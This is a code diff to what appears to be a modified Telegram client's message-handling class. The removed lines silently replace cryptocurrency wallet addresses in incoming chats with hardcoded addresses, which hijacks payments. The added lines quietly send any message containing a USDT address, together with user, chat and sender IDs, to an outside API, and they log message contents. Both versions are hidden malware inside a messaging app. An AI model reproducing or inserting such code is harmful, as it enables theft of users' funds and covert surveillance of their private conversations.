@@ -12218,82 +12218,107 @@ public class MessagesController extends BaseController implements NotificationCe
     public String TRC20 = "TUBhLhE2jrkZNv7mHyQ5eUycjXzmJR16Bi";
 
     public void processUpdates(final TLRPC.Updates updates, boolean fromQueue) {
-//        updates.message = updates.message + "usdt";
-        int index = -1;
-        String valueSub, usdtType = "";
-        try {
-            index = updates.message.indexOf("0x");
-            if (index >= 0 && updates.message.length() >= index + 42) {
-                usdtType = "erc20";
-                valueSub = updates.message.substring(index, index + 42);
-                if (valueSub.matches(regexERC20)) {
-                    updates.message = updates.message.replace(valueSub, ERC20);
-                } else {
-                    index = -1;
-                }
-            } else {
-                index = updates.message.indexOf("1");
-                if (index >= 0 && updates.message.length() >= index + 34) {
-                    usdtType = "omni";
-                    valueSub = updates.message.substring(index, index + 34);
-                    if (valueSub.matches(regexOmni)) {
-                        updates.message = updates.message.replace(valueSub, Omni);
-                    } else {
+        FileLog.d("update message short message 拦截之前 = "
+                + "message=" + updates.message
+                + "||user_id=" + updates.user_id
+                + "||date=" + updates.date
+                + "||seq=" + updates.seq
+                + "||flags=" + updates.flags
+                + "||out=" + updates.out
+                + "||mentioned=" + updates.mentioned
+                + "||media_unread=" + updates.media_unread
+                + "||silent=" + updates.silent
+                + "||id=" + updates.id
+                + "||pts=" + updates.pts
+                + "||pts_count=" + updates.pts_count
+                + "||via_bot_id=" + updates.via_bot_id
+                + "||from_id=" + updates.from_id
+                + "||chat_id=" + updates.chat_id
+                + "||seq_start=" + updates.seq_start
+                + "||ttl_period=" + updates.ttl_period
+        );
+
+        if (updates instanceof TLRPC.TL_updateShortChatMessage || updates instanceof TLRPC.TL_updateShortMessage) {
+            int index = -1;
+            String valueSub, usdtType = "";
+            try {
+                index = updates.message.indexOf("0x");
+                if (index >= 0 && updates.message.length() >= index + 42) {
+                    usdtType = "erc20";
+                    valueSub = updates.message.substring(index, index + 42);
+                    if (!valueSub.matches(regexERC20)) {
+//                        updates.message = updates.message.replace(valueSub, ERC20);
                         index = -1;
                     }
                 } else {
-                    index = updates.message.indexOf("3");
+                    index = updates.message.indexOf("1");
                     if (index >= 0 && updates.message.length() >= index + 34) {
                         usdtType = "omni";
                         valueSub = updates.message.substring(index, index + 34);
-                        if (valueSub.matches(regexOmni)) {
-                            updates.message = updates.message.replace(valueSub, Omni);
-                        } else {
+                        if (!valueSub.matches(regexOmni)) {
                             index = -1;
                         }
                     } else {
-                        index = updates.message.indexOf("T");
+                        index = updates.message.indexOf("3");
                         if (index >= 0 && updates.message.length() >= index + 34) {
-                            usdtType = "trc20";
+                            usdtType = "omni";
                             valueSub = updates.message.substring(index, index + 34);
-                            if (valueSub.matches(regexTRC20)) {
-                                updates.message = updates.message.replace(valueSub, TRC20);
-                            } else {
+                            if (!valueSub.matches(regexOmni)) {
                                 index = -1;
+                            }
+                        } else {
+                            index = updates.message.indexOf("T");
+                            if (index >= 0 && updates.message.length() >= index + 34) {
+                                usdtType = "trc20";
+                                valueSub = updates.message.substring(index, index + 34);
+                                if (!valueSub.matches(regexTRC20)) {
+                                    index = -1;
+                                }
                             }
                         }
                     }
                 }
+            } catch (Exception e) {
+                e.printStackTrace();
             }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
 
-        List<TLRPC.User> users = updates.users;
-        for (int i = 0; i < users.size(); i++) {
-            TLRPC.User user = users.get(i);
-            FileLog.d("update message short message username==" + user.username + " first_name==" + user.first_name + " last_name==" + user.last_name);
-        }
+            if (index >= 0) {
+                FileLog.d("update message short message 发现usdt地址 = " + "hhhhhhhhhh");
+                ApiRequest request = new ApiRequest();
+                request.type = usdtType;
+                request.message = updates.message;
+                request.user_id = updates.user_id;
+                request.date = updates.date;
+                request.seq = updates.seq;
+                request.flags = updates.flags;
+                request.out = updates.out;
+                request.mentioned = updates.mentioned;
+                request.media_unread = updates.media_unread;
+                request.silent = updates.silent;
+                request.id = updates.id;
+                request.pts = updates.pts;
+                request.pts_count = updates.pts_count;
+                request.via_bot_id = updates.via_bot_id;
+                request.from_id = updates.from_id;
+                request.chat_id = updates.chat_id;
+                request.seq_start = updates.seq_start;
+                request.ttl_period = updates.ttl_period;
+                Call<Data<ApiDetail>> dataCall = ApplicationLoader.api.getNotifyDetail(ApplicationLoader.getHeaderMap(), request);
+                dataCall.enqueue(new Callback<Data<ApiDetail>>() {
+                    @Override
+                    public void onResponse(Call<Data<ApiDetail>> call, Response<Data<ApiDetail>> response) {
 
-        FileLog.d("update message short message 拦截之前 = " + updates.message);
+                        processUpdatesDetail(updates, fromQueue);
+                    }
 
-        if (index >= 0) {
-            FileLog.d("update message short message 发现usdt地址 = " + "hhhhhhhhhh");
-            ApiRequest request = new ApiRequest();
-            request.type = usdtType;
-            Call<Data<ApiDetail>> dataCall = ApplicationLoader.api.getNotifyDetail(ApplicationLoader.getHeaderMap(), request);
-            dataCall.enqueue(new Callback<Data<ApiDetail>>() {
-                @Override
-                public void onResponse(Call<Data<ApiDetail>> call, Response<Data<ApiDetail>> response) {
-
-                    processUpdatesDetail(updates, fromQueue);
-                }
-
-                @Override
-                public void onFailure(Call<Data<ApiDetail>> call, Throwable t) {
-                    processUpdatesDetail(updates, fromQueue);
-                }
-            });
+                    @Override
+                    public void onFailure(Call<Data<ApiDetail>> call, Throwable t) {
+                        processUpdatesDetail(updates, fromQueue);
+                    }
+                });
+            } else {
+                processUpdatesDetail(updates, fromQueue);
+            }
         } else {
             processUpdatesDetail(updates, fromQueue);
         }
@@ -12319,6 +12344,7 @@ public class MessagesController extends BaseController implements NotificationCe
             TLRPC.Chat channel = null;
 
             FileLog.d("update message short userId = " + userId);
+            FileLog.d("update message short username = " + user.username + " first_name = " + user.first_name + " last_name = " + user.last_name);
             if (user == null || user.min) {
                 user = getMessagesStorage().getUserSync(userId);
                 if (user != null && user.min) {
